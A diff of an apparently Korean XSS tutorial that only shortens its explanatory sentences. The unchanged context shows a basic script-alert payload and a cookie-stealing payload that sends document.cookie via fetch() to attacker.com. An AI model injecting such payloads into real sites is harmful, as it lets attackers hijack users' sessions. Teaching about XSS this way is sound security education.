@@ -75,7 +75,7 @@ html
 
 #### 1. **기본적인 XSS 공격**
 
-만약 HTML 문서 내에서 `<script>` 태그를 포함시킬 수 있다면, 공격자는 JavaScript 코드를 실행시킬 수 있습니다.
+만약 HTML 문서 내에서 `<script>` 태그를 포함시킬 수 있다면, 공격자는 JavaScript 코드를 실행.
 
 ```html
 <script>alert('XSS');</script>
@@ -85,7 +85,7 @@ html
 
 #### 2. **쿠키 탈취를 위한 XSS 페이로드**
 
-공격자는 악성 스크립트를 사용하여 **쿠키**를 **탈취**할 수 있습니다. 다음과 같은 XSS 페이로드를 사용할 수 있습니다:
+공격자는 악성 스크립트를 사용하여 **쿠키**를 **탈취**. 다음과 같은 XSS 페이로드를 사용:
 
 ```html
 <script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>
